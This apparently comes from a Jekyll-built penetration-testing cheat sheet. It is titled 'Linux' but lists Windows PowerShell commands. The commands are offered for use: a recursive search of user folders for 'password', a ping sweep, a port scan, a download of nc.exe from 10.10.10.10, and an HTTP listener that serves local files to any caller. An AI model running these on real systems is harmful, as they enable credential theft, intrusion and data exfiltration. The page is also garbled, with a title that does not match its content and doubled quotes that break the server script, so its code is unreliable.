---
title: Linux
category: Misc
order: 8
---

>**Help and Finding Commands**

Function | Command
------------- | -------------
help | <code> help [cmdlet] -detailed, -example, -ful </code>
Properties and Methods of object or command | <code> [object/command] | gm </code>


>**Inventory, File Search, and Counting**

Function | Command
--------- | -------
Environment Variables | <code>ls env:, ls variable: </code>
Search for Files | <code>ls -r [dir] [string] 2> $null| % {echo $_.fullname} </code>
Search for text in files | <code>ls -r c:\users | % {select-string -path $_ -pattern password} 2>$null </code>

>**Network and Firewall**


Ping Sweep | <code>1..255 | % {echo "192.168.2.$_"; ping -n 1 -w 100 192.168.2.$_ | select-string ttl} </code>
Port Scan | <code>1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.1.1", $_)) "Port $_ is open" } 2>$null </code>
Web Client Download | <code>(New-Object System.Net.WebClient).DownloadFIle("http://10.10.10.10/nc.exe", "c:\nc.exe") </code>

SimpleHTTPServer: 
{% highlight powershell %}
$Hso = New-Object Net.HttpListener 
$Hso.Prefixes.Add(""http://+:8000/"")
$Hso.Start()
While ($Hso.IsListening) {
$HC = $Hso.GetContext()
$HRes = $HC.Response
$HRes.Headers.Add(""Content-Type"",""text/plain"")
$Buf = [Text.Encoding]::UTF8.GetBytes((GC (Join-Path $Pwd ($HC.Request).RawUrl)))
$HRes.ContentLength64 = $Buf.Length
$HRes.OutputStream.Write($Buf,0,$Buf.Length)
$HRes.Close()
}
$Hso.Stop()
{% endhighlight %}
